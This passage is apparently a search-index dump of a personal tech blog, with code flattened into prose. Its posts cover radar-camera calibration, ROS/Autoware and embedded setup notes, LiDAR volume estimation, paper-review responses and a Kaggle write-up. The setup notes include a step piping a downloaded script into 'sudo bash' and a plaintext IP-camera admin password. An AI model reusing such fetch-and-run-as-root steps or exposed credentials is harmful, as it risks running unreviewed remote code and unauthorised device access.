每一图像帧时刻的雷达轨迹，以四元数或欧拉角描述 { w, x, y, z}/{ x, y, z, rx, ry, rz} 视觉雷达联合标定初始数据格式：光学相机：相机内参，畸变函数；相机外参 雷达： 雷达外参数。处理方式：将毫米波雷达返回的目标点投影到图像上，围绕该点并结合先验知识，生成一个矩形的感兴趣区域，然后我们只对该区域内进行识别（水岸分割模型或目标检测模型）。优点是可以迅速地排除大量不会有目标的区域，极大地提高识别速度。建立精确的毫米波雷达坐标系、三维世界坐标系、摄像机坐标系、图像坐标系和像素坐标系之间的坐标转换关系，是实现毫米波和视觉融合的关键。毫米波雷达与视觉传感器在空间的融合就是将不同传感器坐标系的测量值转换到同一个坐标系中。由于ADAS前向视觉系统以视觉为主，因此只需将毫米雷达坐标系下的测量点通过坐标系转换到摄像机对应的像素坐标系下即可实现两者空间同步。联合标定的目的：将毫米波检测的目标转换到图像上。 联合标定方式（原理）： 毫米波坐标系下的坐标转换到以相机为中心的世界坐标系中 将世界坐标系的坐标转换到相机坐标系 将相机坐标系的坐标转换到图像坐标系 毫米波可以得到目标在图像中的x,y坐标信息（文档中提到的拟合平面，该xy是在毫米波坐标系下的数值，2D），由于没有目标的z坐标信息，可以由（x,y,1）将毫米波坐标系转换到相机世界坐标系下，","categories":[{"name":"Notes","slug":"Notes","permalink":"http://waynamigo.github.io/categories/Notes/"}],"tags":[{"name":"PointCloud","slug":"PointCloud","permalink":"http://waynamigo.github.io/tags/PointCloud/"}]},{"title":"点云业务开发(ROS,Autoware)及嵌入式开发的一些备忘","slug":"2022-09-14-点云ROS业务","date":"2022-09-13T16:00:00.000Z","updated":"2023-01-04T06:41:18.513Z","comments":true,"path":"2022/09/14/2022-09-14-点云ROS业务/","link":"","permalink":"http://waynamigo.github.io/2022/09/14/2022-09-14-点云ROS业务/","excerpt":"ROS, Autoware编译, rk3399开发板在实验室网络设置等的一些备忘","text":"ROS, Autoware编译, rk3399开发板在实验室网络设置等的一些备忘 conda :gcc,make,gpgme,libarchive,zstd,conda lib for system /lib pacmansource codehttps://sources.archlinux.org/other/pacman/ 12PKG_CHECK_MODULES(LIBARCHIVE, [libarchive &gt;= 3.0.0], , AC_MSG_ERROR([*** libarchive &gt;= 3.0.0 is needed to compile pacman!])) rk3399 4g module disble (for now):rk_wifi_init module(driver) is not able to execute setting for static ip 12345678910111213141516171819ip : using DHCP in this room of ifconfig (after login in at UPC)gateway : ip addr/ ifconfig/ netstat -rnnetmask : ip addr to check network segment and calculate yourselfmodify: /etc/network/interfacesauto [your eth name]iface [you eth name] inet [static]address [your ip]netmask [your netmask]gateway [your gateway]broadcast [your broadcast]ep.auto eth0iface eth0 inet staticaddress 180.201.136.11netmask 255.255.192.0gateway 180.201.128.1 12ifconfig eth0 downifconfig eth0 up networkauthif the issue below occured:“Failed to establish a new connection: [Errno -2] Name or service not known…”detail:“requests.exceptions.ConnectionError: HTTPSConnectionPool(host=’xx’, port=443): Max retries exceeded with url: /appapi/exchange/19/v1/prolist (Caused by NewConnectionError(‘&lt;urllib3.connection.VerifiedHTTPSConnection object at 0x7fca889818d0&gt;: Failed to establish a new connection: [Errno -2] Name or service not known’,))” solution 121. PING lan.upc.edu.cn -&gt; (121.251.251.207) 2. lan.upc.edu.cn &gt;&gt; /etc/hosts run networkAuth script cross-compile :: https://github.com/RangiLyu/nanodetgcc compiler toolchainfor x86(host)-aarch64 compiler env 12341. untar the toolchain package2. export PATH=\"&lt;toolchain-compiler-bin-path&gt;:$&#123;PATH&#125;\"3. apt install g++-arm-linux-gnueabi g++-arm-linux-gnueabihf g++-aarch64-linux-gnu execute on -- aarch64-none-linux-gnu-gcc ncnn env 124. https://github.com/RangiLyu/nanodet/blob/main/demo_ncnn/README.md5. ncnn test: https://blog.csdn.net/LuohenYJ/article/details/97031156 123FOUND OpenCV [error]:IMPORTED library can only be used with the INTERFACE keyword of target_link_libraries clashamdswitchyomega.crx .crx -&gt; .zip -&gt; drag ROS env ROS envfollow this readme and ros-full-desktop dependencies PCL and YAML will be incidental in this version. 123456789101112131415## add aptkeys and update repositorysudo sh -c 'echo \"deb http://packages.ros.org/ros/ubuntu $(lsb_release -sc) main\" &gt; /etc/apt/sources.list.d/ros-latest.list'curl -s https://raw.githubusercontent.com/ros/rosdistro/master/ros.asc | sudo apt-key add -sudo apt-get update## install ros-desktop with includedsudo apt install ros-noetic-desktop-full## install dependenciesecho \"source /opt/ros/noetic/setup.bash\" &gt;&gt; ~/.bashrcsudo apt install python3-rosdep python3-rosinstall python3-rosinstall-generator python3-wstool build-essential ## install these dependencies in casesudo apt-get install libboost-dev libpcap-dev libpcl-dev libeigen3-dev## empy and catkin_pkg installationif you are using python default , then install python3-empy with aptif you are using conda, then ```pip install empy catkin_pkg LiDAR sdk compilation with catkin mkdir [empty folder name] move rslidar_sdk/ to [empty folder name]/src catkin_make source devel/setup.bash roslaunch rslidar_sdk start.launch 1234567891011121314151617**ros1 + ros2**```bash## dependenciessudo apt-get install python3-colcon-common-extensions python3-flake8 python3-pip python3-pytest-cov python3-rosdep python3-setuptools python3-vcstool python3-rosdep## setting apt repo addresssudo sh -c &apos;echo &quot;deb [arch=$(dpkg --print-architecture)] http://packages.ros.org/ros2/ubuntu $(lsb_release -cs) main&quot; &gt; /etc/apt/sources.list.d/ros2-latest.list&apos;update &amp; install ros-foxy-desktopfile -- .bashrcsource /opt/ros/foxy/setup.bash## test ros2 run demo_nodes_cpp talker## removesudo apt remove ros-foxy-* &amp;&amp; sudo apt autoremove AutowareAuto 1234567891011121314git clone https://gitlab.com/autowarefoundation/autoware.auto/AutowareAuto.git## dependicescurl -s https://packagecloud.io/install/repositories/github/git-lfs/script.deb.sh | sudo bashsudo apt-get install git-lfs## vsc import &amp; install ros external dependicesvcs import &lt; autoware.auto.foxy.reposrosdep install -y -i --from-paths srcgit lfs pull --exclude=\"\" --include=\"*\"export COLCON_DEFAULTS_FILE=/home/waynamigo/AutowareAuto/tools/ade_image/colcon-defaults.yaml## compile by colcon with CUDAAUTOWARE_COMPILE_WITH_CUDA=1 colcon build --cmake-args -DCMAKE_BUILD_TYPE=Release## testcolcon testcolcon test-result --verbose ip cameraip -192.168.1.64user: adminpasswd: abcd-1234issues cant be recognized with reticle unplugged(bridge0) sdk lib /etc/ld.so.conf``` **content**:123456```bashinclude /etc/ld.so.conf.d/*.conf/home/waynamigo/Documents/HKVISION/CH-HCNetSDKV6.1.9.4_build20220413_linux64/lib/home/waynamigo/Documents/HKVISION/CH-HCNetSDKV6.1.9.4_build20220413_linux64/lib/HCNetSDKCom#/home/waynamigo/Documents/LiDAR/usr/local/lib clip task – paper CLIP4Hashing: Unsupervised Deep Hashing for Cross-Modal Video-Text Retrieval. ICMR Segmentation in Style: Unsupervised Semantic Image Segmentation with Stylegan and CLIP. CoRR abs/2107.12518 (2021) clip retrieval Conditioned and composed image retrieval combining and partially fine-tuning CLIP-based features. CVPR Workshops 2022: 4955-4964 VideoCLIP: A Cross-Attention Model for Fast Video-Text Retrieval Task with Image CLIP. ICMR 2022: 29-33 Extending CLIP for Category-to-Image Retrieval in E-Commerce. ECIR (1) 2022: 289-303 Animating Images to Transfer CLIP for Video-Text Retrieval. SIGIR 2022: 1906-1911 X-CLIP: End-to-End Multi-grained Contrastive Learning for Video-Text Retrieval. CoRR abs/2207.07285 (2022) cloud nativekv enginepolarDBbaidu Atlas[alibaba competition]https://tianchi.aliyun.com/competition/entrance/531979/information go project structurehttps://blog.csdn.net/weixin_44757863/article/details/120349003 RPC RMIRMI stands for Remote Method Invocation, is a similar to PRC but it supports object-oriented programming which is the java’s feature.RPC RPC(Remote Procedure Call，远程过程调用)是一种计算机通信协议，允许调用不同进程空间的程序。RPC 的客户端和服务器可以在一台机器上，也可以在不同的机器上。程序员使用时，就像调用本地程序一样，无需关注内部的实现细节。 不同的应用程序之间的通信方式有很多，比如浏览器和服务器之间广泛使用的基于 HTTP 协议的 Restful API。与 RPC 相比，Restful API 有相对统一的标准，因而更通用，兼容性更好，支持不同的语言。HTTP 协议是基于文本的，一般具备更好的可读性。但是缺点也很明显： Restful 接口需要额外的定义，无论是客户端还是服务端，都需要额外的代码来处理，而 RPC 调用则更接近于直接调用。 基于 HTTP 协议的 Restful 报文冗余，承载了过多的无效信息，而 RPC 通常使用自定义的协议格式，减少冗余报文。 RPC 可以采用更高效的序列化协议，将文本转为二进制传输，获得更高的性能。 因为 RPC 的灵活性，所以更容易扩展和集成诸如注册中心、负载均衡等功能。 命令式编程(Imperative/procedual)、声明式编程(Declarative)和函数式编程(Functional) RPC gRPC","categories":[{"name":"PointCloud","slug":"PointCloud","permalink":"http://waynamigo.github.io/categories/PointCloud/"}],"tags":[{"name":"PointCloud","slug":"PointCloud","permalink":"http://waynamigo.github.io/tags/PointCloud/"},{"name":"Embedded","slug":"Embedded","permalink":"http://waynamigo.github.io/tags/Embedded/"},{"name":"ROS","slug":"ROS","permalink":"http://waynamigo.github.io/tags/ROS/"},{"name":"Autoware","slug":"Autoware","permalink":"http://waynamigo.github.io/tags/Autoware/"}]},{"title":"激光体积估算业务Solution?","slug":"2022-08-24-激光扫描的堆体体积估算","date":"2022-08-23T16:00:00.000Z","updated":"2023-01-04T06:49:21.842Z","comments":true,"path":"2022/08/24/2022-08-24-激光扫描的堆体体积估算/","link":"","permalink":"http://waynamigo.github.io/2022/08/24/2022-08-24-激光扫描的堆体体积估算/","excerpt":"通过激光进行堆体体积估算","text":"通过激光进行堆体体积估算 堆体体积估算LiDAR场区配置：两个方案 Solution1多个LiDAR固定后，点云拼接建图（例如三个LiDAR探测面覆盖整个料场） Solution2LiDAR 云台移动扫描建图（云台扫描2D切面叠加，积分计算体积） RequirementsLiDAR点云数据格式 rx,ry,rz,ro,r,g,b,s(反射强度)功能需求1) 料场盘库重量估算。激光雷达扫描料堆得到点云数据后，LiDAR根据点云数据提供料堆三维模型尺寸，切片法计算出料堆体积，通过经验密度值计算出料堆重量。2) 料堆位置坐标信息。以获取每一类料堆的类别和位置，配合皮带入库位置选择及抓取出库，并可供用户实时查看库存情况。3) 可视化场堆信息。根据各存料车间需求进行定制化服务，利用车间尺寸图纸划分点云地图区域，并反馈给车间管理人员实时查看现场库存情况。方案：由移动云台带动激光雷达进行料堆扫描，或根据固定的LiDAR探测面获取的点云配准后，对料堆进行点云拼接，进行完整的建图，以准确获取料堆的斜立面信息与完整的料堆顶面信息。难点难点1，点云去噪：三维激光扫描过程中不可避免地会获得大量的噪声点云。 包括漂移点、孤立点、冗余点、混杂点等)的存在不仅增加了数据量，而且会严重影响点云质量和后续矿堆体积量测难点2. 不同颜色堆垛对LiDAR点云扫描的误差影响：不同颜色对光的反射是不同的，黑色反射比最小约为10%，扫描距离是最小的，如果测的是白色物体，反射比约为80%，扫描距离就比黑色范围大。难点3. 误差：本方案通过切片法快速计算体积。采用拟合出的基准面（地面），根据选取的待测区域对基准面以上的3D区域，进行高精度体积测算，并结合经验密度，积分计算出重量。","categories":[{"name":"PointCloud","slug":"PointCloud","permalink":"http://waynamigo.github.io/categories/PointCloud/"}],"tags":[{"name":"PointCloud","slug":"PointCloud","permalink":"http://waynamigo.github.io/tags/PointCloud/"},{"name":"Notes","slug":"Notes","permalink":"http://waynamigo.github.io/tags/Notes/"}]},{"title":"GRSL Reviewer Comments","slug":"2022-01-24-审稿意见","date":"2022-01-23T16:00:00.000Z","updated":"2023-11-06T12:20:06.694Z","comments":true,"path":"2022/01/24/2022-01-24-审稿意见/","link":"","permalink":"http://waynamigo.github.io/2022/01/24/2022-01-24-审稿意见/","excerpt":"持续更新","text":"持续更新 Your paper GRSL-01600-2023 Multi-Stage Synergistic Aggregation Network for Remote Sensing Visual Grounding has been carefully reviewed by the GRSL review panel and found to be unacceptable in its present form. The reviewers did suggest, however, that if completely revised the paper might be found acceptable. We encourage you to revise and resubmit this manuscript as a new paper to GRSL. If you do decide to resubmit the paper, please include a point-by-point response to the comments of the reviewers along with the new paper in order to expedite its review. Use the “Submit a Resubmission” link in your author center when you submit the new manuscript. Your resubmission is due by 05-Jan-2024 Below you will find comments from the review panel. Any attached files that may be referenced with these comments can be accessed in a copy of this decision letter located in your Author Center on ScholarOne Manuscripts. Sincerely,Dr. Avik BhattacharyaEditor-in-ChiefIEEE Geoscience and Remote Sensing Letters 您的论文GRSL-01600-2023《用于遥感视觉定位的多阶段协同聚合网络》已经被GRSL审稿小组仔细审查，并认为其当前形式不可接受。然而，审稿人建议，如果完全修订，可能会被接受。我们鼓励您对此手稿进行修订，并以新论文的形式重新提交给GRSL。 如果您决定重新提交该论文，请在新论文中包括对审稿人评论的逐条回应，以加快审查过程。在提交新手稿时，请使用您的作者中心中的“提交修订”链接。您的重新提交截止日期为2024年1月5日。 以下是审稿小组的评论。与这些评论相关的任何附件文件可以在ScholarOne手稿的作者中心中找到，该决定信的副本中包含了这些附件文件的链接。 Associate Editor Comments:Associate EditorComments to the Author:According to the comments, the innovation of the proposed method is doubtful. The introduction and detail information of the proposed method is not clear. Besides, this manuscript needs to be further improved in terms of writting. Reviewer(s) Comments:Reviewer: 1 Comments to the AuthorThe authors propose a multi-stage synergistic aggregation network for remote sensing visual grounding to address the correlations between textual semantics and visual information, as well as the dependencies between features and bounding box representations. My major comments are as follows: (1) The literature review on remote sensing visual grounding methods is inadequate. I recommend that the authors provide a more comprehensive literature review on remote sensing visual grounding methods.(2) The authors state that existing methods overlooked the crucial dependencies between features and bounding box representations. I cannot understand what these dependencies are. Please add more descriptions to explain them.(3) The authors do not introduce the objective function of the proposed method. Please add the definition of the objective function.(4) The proposed method is complex and not easy to understand. I suggest that the authors make their code publicly available and release their best model to allow for result reproduction. This will greatly influence my decision.(5) There is some inconsistent expression. For example, in Fig. 1, “Query channel Attention” is denoted as “QCA,” and “Cross Attention” is denoted as “CA Layer.” Additionally, the authors usually use “QCB” to refer to “Query Channel Attention” in the context, but in Fig. 1, “QCA” is used, which is confusing.(6) I suggest the authors add a comma or a period at the end of different equations. (1) 关于遥感视觉接地方法的文献综述不够充分。我建议作者对遥感视觉接地方法进行更全面的文献综述。(2) 作者指出，现有方法忽略了地物与边界框表示之间的关键依赖关系。我不明白这些依赖关系是什么。请补充说明。x (3) 作者没有介绍建议方法的目标函数。请补充目标函数的定义。resp：我们在experiments的文本描述部分，描述了预测头为两层结构的mlp，和使用的损失函数为cross entropyloss“The prediction head is simply designed as a two-layer MLP. The utilized loss function is the cross-entropy(CE) loss.”，现在将损失函数以公示x进行明确了定义和对应的使用。x (4) 建议的方法很复杂，不容易理解。我建议作者公开他们的代码，并发布他们的最佳模型，以便复制结果。这将极大地影响我的决定。resp ：我们将首先公开源码和最佳模型，和注意力热力图的可视化代码，并且后续会无保留地整理好消融实验的分支代码和对应的模型权重，请保持耐心：https://github.com/waynamigo/AGT-MSVG。x (5) 有些表达不一致。例如，在图 1 中，”Query channel Attention “表示为 “QCA”，而 “Cross Attention “表示为 “CA Layer”。此外，作者在上下文中通常使用 “QCB “来指代 “查询通道注意”，但在图 1 中却使用了 “QCA”，这容易引起混淆。resp：我们修改了fig1中的错误，感谢您的指正，为粗糙的第一版手稿感到抱歉x (6) 我建议作者在不同等式的末尾加上逗号或句号。 resp：已在最新的submission中更改了修改后的公式。 Reviewer: 2 Comments to the AuthorOverall, this is a well-structured paper, but there are several writing issues. The paper focuses on the latest RSVG task and proposes a novel multi-stage synergistic aggregation module that effectively aggregates visual and textual contexts to facilitate the learning of multi-scale multimodal features. However, the introduction of the generative paradigm, which is the innovative aspect, may not be appropriate. The reviewer thinks this manuscript is not acceptable without major revisions. 总体而言，这是一篇结构良好的论文，但存在一些写作问题。论文侧重于最新的RSVG任务，并提出了一个新颖的多阶段协同聚合模块，可以有效地聚合视觉和文本上下文，以促进多尺度多模态特征的学习。然而，引入创新性范式的部分可能不太恰当。审稿人认为，如果没有进行重大修订，这篇手稿将无法被接受。 standardize writing, precise formula symbols Is the ‘Auto-Regressive Transformer’ in Figure 1(a) the same module as the ‘Generative Transformer’ in (b)? Please ensure consistent expression. Section II.C is referred to as the ‘Auto-regressive Generative Transformer’. In Section II, the first appearance of the symbol “i” in i needs to be explained clearly; it seems inconsistent with the meaning in formulas (2), (3), (4), and (5). In the section “Feature Aggregation,” it is stated that “i presents the i-th stage of aggregation.”. It is mentioned in the letter that “if there are n queries associated with the same image, then the image forms n samples with these n queries.” And in “The embedding set can be presented as ={[CLS], t1, t2, t3, …, tn},” the symbol “n” is used, which should not represent the same meaning. Formulas (6) and (7) also use “n,” please carefully check and differentiate symbols with different meanings. Section “Transformer Decoder” is poorly written. This section references formulas (9) and (12), but it is clear that formula (12) does not exist. So there is an error, please modify it carefully. What does “Cxy” mean in formula (8)? Does it have the same meaning as “Cxy” in Figure 1(a)? What is the meaning of “kwh”? What is the difference between “Cbins” and “Cˆbins”? What is the difference between “Cxy” and “Cˆxy”? What is “Sc”? What are s1, s2, s3, s4? They are not explained clearly. There is a grammar error: “The result sequence Cˆbins predicted by the decoder can be inverse quantized with (12) to obtain the floating-point result, we use Cbins.” This sentence is incorrect as there are complete sentences before and after the comma. To clarify, this does NOT means expressions in other text are right. Please thoroughly check the grammar in the paper. Several symbols, such as “n,” “k,” etc., are not in italic font. Please carefully check and modify.x 1. 图 1(a)中的 “自回归变压器 “与(b)中的 “生成变压器 “是同一个模块吗？请确保表述一致。第 II.C 节称为 “自动回归生成变换器”。感谢指正，我们的自回归transformer起到的作用就是生成器的作用，由于写作的疏忽，现在已为了避免混淆将fig1中的agt改成了aggt，这将避免了上下文歧义。 x 2. 在第 II 节中，i 中第一次出现的符号 “i “需要解释清楚；它似乎与公式 (2)、(3)、(4) 和 (5) 中的含义不一致。在 “特征聚合 “一节中，”i 表示聚合的第 i 个阶段”。在II节中我们重新描述了图像I与文本T的对应关系，作为样本对的集合，避免了与接下来的（2345）公式的混淆 x 3. 信中提到，”如果有 n 个查询与同一幅图像相关联，那么图像就会与这 n 个查询形成 n 个样本”。而在 “嵌入集可以表示为 ={[CLS], t1, t2, t3, …, tn}”中，使用了符号 “n”，这不应该代表相同的含义。公式 (6) 和 (7) 也使用了 “n”，请仔细检查并区分不同含义的符号。 “变压器解码器 “一节写得不好。该节引用了公式 (9) 和 (12)，但显然不存在公式 (12)。因此存在错误，请仔细修改。公式（8）中的 “Cxy “是什么意思？与图 1(a)中的 “Cxy “含义相同吗？kwh” 的含义是什么？Cbins” 和 “Cˆbins” 有什么区别？Cxy” 和 “Cˆxy “有什么区别？什么是 “Sc”？什么是 s1、s2、s3、s4？ 没有解释清楚。 有一个语法错误： “解码器预测的结果序列 Cˆbins 可以用（12）进行反量化，得到浮点结果，我们使用 Cbins。这句话不正确，因为逗号前后都有完整的句子。需要说明的是，这并不意味着其他文本中的表达是正确的。请彻底检查论文中的语法。 有几个符号，如 “n”、”k “等，没有用斜体字。请仔细检查并修改。 novelty Contribution 2) mentions introducing the generation paradigm into the RSVG field. Please explain what exactly the generation paradigm means. In the abstract, it is mentioned as “generate discrete coordinates sequence in an auto-regressive manner,” but the MGVLF proposed in reference [17] also generates discrete coordinates through feature regression. This contribution point is not sufficient. experiments In Section A, it is stated that “our framework achieves improved visual representation learning for small-scale objects.” How can you prove this through qualitative or quantitative results? Otherwise, it is difficult to draw this conclusion. other Reference [17] constructs the DIOR-RSVG dataset, and the proposed method is named MGVLF. Please modify the entire letter and TABLE 1 accordingly. The Venue should be TGRS, not IEEE. Is the ‘Prediction Head’ in Figure 1(a) the same as ‘MLP’ in (b)? Refer to recent articles [1] on remote sensing vision-language task.[1] Y. Yuan, Y. Zhan and Z. Xiong, “Parameter-Efficient Transfer Learning for Remote Sensing Image–Text Retrieval,” in IEEE Transactions on Geoscience and Remote Sensing, vol. 61, pp. 1-14, 2023, Art no. 5619014, doi: 10.1109/TGRS.2023.3308969. 新奇 贡献 2）提到将生成范式引入 RSVG 领域。请解释一下生成范式的确切含义。摘要中提到 “以自动回归方式生成离散坐标序列”，但参考文献 [17] 中提出的 MGVLF 也是通过特征回归生成离散坐标的。这个贡献点还不够。 实验 A 部分指出 “我们的框架改进了小尺度物体的视觉表征学习”。如何通过定性或定量结果来证明这一点？否则很难得出这一结论。 其他vx1. 参考文献 [17] 构建了 DIOR-RSVG 数据集，提出的方法被命名为 MGVLF。请相应修改整封信和表 1。地点应为 TGRS，而不是 IEEE。 x2. 图 1(a)中的 “预测头 “与(b)中的 “MLP “是否相同？ 参考最近关于遥感视觉语言任务的文章 [1]。[1] Y. Yuan, Y. Zhan and Z. Xiong, “Parameter-Efficient Transfer Learning for Remote Sensing Image-Text Retrieval,” in IEEE Transactions on Geoscience and Remote Sensing, vol. 61, pp.","categories":[{"name":"Visual Grounding","slug":"Visual-Grounding","permalink":"http://waynamigo.github.io/categories/Visual-Grounding/"}],"tags":[{"name":"Visual Grounding","slug":"Visual-Grounding","permalink":"http://waynamigo.github.io/tags/Visual-Grounding/"}]},{"title":"跨模态检索论文阅读合集","slug":"2021-12-29-跨模态检索论文阅读合集","date":"2021-12-28T16:00:00.000Z","updated":"2023-01-04T06:09:20.614Z","comments":true,"path":"2021/12/29/2021-12-29-跨模态检索论文阅读合集/","link":"","permalink":"http://waynamigo.github.io/2021/12/29/2021-12-29-跨模态检索论文阅读合集/","excerpt":"阅读的跨模态检索相关论文合集","text":"阅读的跨模态检索相关论文合集 2022-03-16更新论文的note及总结在mendeley里，缺点是不好导出，有空手动搞出来再更新。 梳理数据集和benchmark常用的是MSCOCO和Flickr30k数据集，数据量多，且图像：文本为1:5，操作空间大。对性能评估的讨论基本是围绕Recall@k展开，其中I2T的Recall普遍比 paperswithcode的检索Flickr30K数据集benchmark SCAN:Stacked Cross Attention for Image-Text Matching-CVPR 2018","categories":[{"name":"DL","slug":"DL","permalink":"http://waynamigo.github.io/categories/DL/"}],"tags":[{"name":"CV","slug":"CV","permalink":"http://waynamigo.github.io/tags/CV/"},{"name":"Multimodal","slug":"Multimodal","permalink":"http://waynamigo.github.io/tags/Multimodal/"},{"name":"PreTraining","slug":"PreTraining","permalink":"http://waynamigo.github.io/tags/PreTraining/"}]},{"title":"A Survey of Restoration of Non-rigidly Distorted Image","slug":"2021-12-17-non-rigid_image_distorted_image_recovery","date":"2021-12-16T16:00:00.000Z","updated":"2022-07-16T04:45:09.599Z","comments":true,"path":"2021/12/17/2021-12-17-non-rigid_image_distorted_image_recovery/","link":"","permalink":"http://waynamigo.github.io/2021/12/17/2021-12-17-non-rigid_image_distorted_image_recovery/","excerpt":"非刚性平面扰动图像恢复，应用：2D，3D，视频数据","text":"非刚性平面扰动图像恢复，应用：2D，3D，视频数据","categories":[{"name":"DL","slug":"DL","permalink":"http://waynamigo.github.io/categories/DL/"}],"tags":[{"name":"CV","slug":"CV","permalink":"http://waynamigo.github.io/tags/CV/"}]},{"title":"Vison-Language-Navigation","slug":"2021-08-01-vqa2vln","date":"2021-07-31T16:00:00.000Z","updated":"2022-10-26T04:23:52.443Z","comments":true,"path":"2021/08/01/2021-08-01-vqa2vln/","link":"","permalink":"http://waynamigo.github.io/2021/08/01/2021-08-01-vqa2vln/","excerpt":"关于CVPR2021，VQA2VLN的tutorial的总结","text":"关于CVPR2021，VQA2VLN的tutorial的总结 tutorial原地址：CVPR 2021 Tutorial on “From VQA to VLN: Recent Advances in Vision-and-Language Research”，本笔记总结一下在ppt里展示的VLN任务的内容，几位演讲者的视频还没看，毕竟有ppt和论文，概念理解应该不会有偏差 Background浏览了一下，VLN其实是算一个在人机交互大背景下的Visual+Language的研究方向，其实和之前做的三维重建+导航有点关系，总而言之是2D和3D视觉方面的东西，下面稍微总结了下，后几个ppt还没看完，后面会追加该方向的论文链接和相关内容 See, Communicate, Act机器模拟人的几种模拟方式，基本是将机器在看（视觉）、交流（文本）、行动几种模式下提高智能化，现在在See和Communicate两种模式的比较有代表性领域就是Computer Vision和Nature Language Processing，还有视觉和自然语言相结合的领域，例如Image-Understanding任务。前几年利用视觉和自然语言实现的智能化是从比较独立的模块获取的信息，比如目标检测，获取物体在图像上的(位置, 类别)，给机器做一些什么任务，比如统计xx，预测人流量等。目前用结合See-Communicate(Vision-Language)的发展比较好的方向有VQA, Captioning,Text2Image Generation等。 会议上提到的这个VLN领域的理念是Connecting Vision and Language to Actions, 将vision(2D,3D)、language和(行动/指令)联系起来，理解复杂场景，并对输入请求做出具体行动，相当于是Video Understanding下的子任务。 Embodied AI “Embodied AI is the field for solving AI problems for virtual robots that can move, see, speak, and interact in the virtual world.” 这是在page里的一个引言，关于实体AI(暂译)，就是让机器获得 视听说、行动、理解几种功能，集成算法达到一个接近人一样的智能体，从Internet AI 过渡到 Embodied AI，甚至是给AGI，Artificial General Intelligence打基础，有一个关于Embodied AI的survey：Duan et al., A survey of Embodied AI: From simulators to Research Tasks, 2021 Vision-Language NavigationVLN是2018年提出的一个研究领域，当时的子标题是Vision-and-Language Navigation: Interpreting visually-grounded navigation instructions in real environments：在现实环境下，让机器理解基于视觉定位的导航指令。 左下是人为给出的指令通俗来讲VLN任务就是为了给机器人导航，有两个任务：①如何理解现实场景②对于给出的Instructions，如何理解并做出行动与3D视觉导航的区别（如自动驾驶使用的视觉SLAM、Radar等） 3D-Navigation : SLAM下从图像帧中处理得到点云判别障碍物、方位 Sensor-Navigation : 传感器获取的空间信息（Radar、Lidar等） ，判别障碍物、方位SLAM —&gt; PointCloud —&gt; directionSensor —&gt; Mesh —&gt; direction VL-Navigation : Agent(摄像头)获取的视频信息，理解场景内容，并对指令做出行动，目前主要是在室内场景下研究导航任务 与VQA的区别VLN相对增加了动态视觉（相机运动）、长文本、测试集和训练集上的领域差距 domain gap指的是比如在室内场景下训练，在室外场景测试，效果可能就急剧下降，并且一个训练样本就可以是整个场景，（比如浙江大学的3D重建方法，NeuralRecon所用的Scannet数据） Indoor VLN目前VLN主要是研究室内的导航任务，室内导航任务的几种指令难度等级 1. A到B的位移 2.找东西（可见） 3.找东西（不可见） 4.向人有针对性的提问得到更详细的信息，用这些追加的信息找东西 Indoor VLN ChallengesSignificant Appearance Variation，同一种物体有不同外观 Rich Linguistic Phenomena，丰富的语境 Less Words, More Contents，文本所能表达的东西太少 VLN Models Seq2seq (a golden baseline) • Speaker-follower Attention Mechanism (something must try) • EnvDrop, Self-monitoring, OAAM Transformer (this is all you need) • PREVALENT, Recurrent-Bert Reinforcement Learning (Add-on) • RCM, Soft Expert DatasetsR2R 在214服务器上生成好了，从matterport模拟器得到的R2R任务 path distance 等CVDNNDH Metrics Success / Oracle Success Rate (%) Navigation Error (m) SPL (Success weighted by Path Length) CLS (Coverage weighted by Length Score) • Measuring fidelity to the reference path nDTW (normalized Dynamic Time Warping) SDTW (Success weighted by normalized Dynamic Time Warping)Addition","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/tags/ML/"},{"name":"DL","slug":"DL","permalink":"http://waynamigo.github.io/tags/DL/"},{"name":"MultiMedia","slug":"MultiMedia","permalink":"http://waynamigo.github.io/tags/MultiMedia/"},{"name":"Vision","slug":"Vision","permalink":"http://waynamigo.github.io/tags/Vision/"},{"name":"NLP","slug":"NLP","permalink":"http://waynamigo.github.io/tags/NLP/"}]},{"title":"Optiver Realized Volatility Prediction","slug":"2021-07-01-kaggle-LGB-optiver-realized-volatility-prediction","date":"2021-06-30T16:00:00.000Z","updated":"2022-07-16T04:45:09.637Z","comments":true,"path":"2021/07/01/2021-07-01-kaggle-LGB-optiver-realized-volatility-prediction/","link":"","permalink":"http://waynamigo.github.io/2021/07/01/2021-07-01-kaggle-LGB-optiver-realized-volatility-prediction/","excerpt":"以后写kaggle尽量都用一些实用性的算法，该面向简历编程了，论文阅读笔记之类的以后都尽量用英语写","text":"以后写kaggle尽量都用一些实用性的算法，该面向简历编程了，论文阅读笔记之类的以后都尽量用英语写 BackgroundOptiver Realized Volatility Prediction Competition.This kaggle project is about trying diff methods to predict the volatility of a trading floor for trading firms,The Accurate Volatility, which is essencial for their investing options.Also is an essencial data standard related to the price of underlying product.IN short, We have to find the most effective approach to minus RMSPE. Given Data12345dataset├── book_test.parquet├── book_train.parquet├── trade_test.parquet└── trade_train.parquet Each folder contains stock_id=ntrade [‘time_id’, ‘seconds_in_bucket’, ‘price’, ‘size’, ‘order_count’]book [‘time_id’, ‘seconds_in_bucket’, ‘bid_price1’, ‘ask_price1’, ‘bid_price2’, ‘ask_price2’, ‘bid_size1’, ‘ask_size1’, ‘bid_size2’, ‘ask_size2’],train [‘stock_id’,’time_id’,’target’]test [‘stock_id’,’time_id’,’row_id’] financial conceptsshow case: bid price ask 151 196 150 189 149 148 148 221 251 147 351 146 300 145 20 144 1.Content of an order book - A list of buy or sell records sorted by price, which lists the number of shares being bid on or offered at each price point. - in the case of given data,’bid’ means How many shares the Buyer want to buy , ‘ask’ means How many shares Sellers offer. EACH order book&amp;trade book belongs to 1 kind of stock 2.Trade procedure - a TRADE HAPPENS when the shares of stock that seller S offers and buyer B bids at the same price. - B can up his/her intended price and buy the offered by S. 3.Liquidity there’re some statistics standards for analyser to estimate the liquidity of an order book. - WAP(weighted avaraged price)takes the price level and size of orders $$wap = \\frac{bidprice1asksize1+askprice1bidsize1}{asksize1+bidsize1}$$ Code for WAP caculation, add one column as ‘wap’ 1234book_parquet['wap'] = (book_parquet['bid_price1'] * book_parquet['ask_size1'] + book_parquet['ask_price1'] * book_parquet['bid_size1'])/(book_parquet['bid_size1']+ book_parquet['ask_size1']) 4.Log returnsanother vital standard for comparing the price of a stock in yesterday and todaycalling $S_t$ is the price of stock at time $t$ ,the log return is $r_{t1,t2}$,$$r_{t_1, t_2} = \\log{\\frac{S_{t_2}}{S_{t_1}}}$$Noticed The host wants competitors should 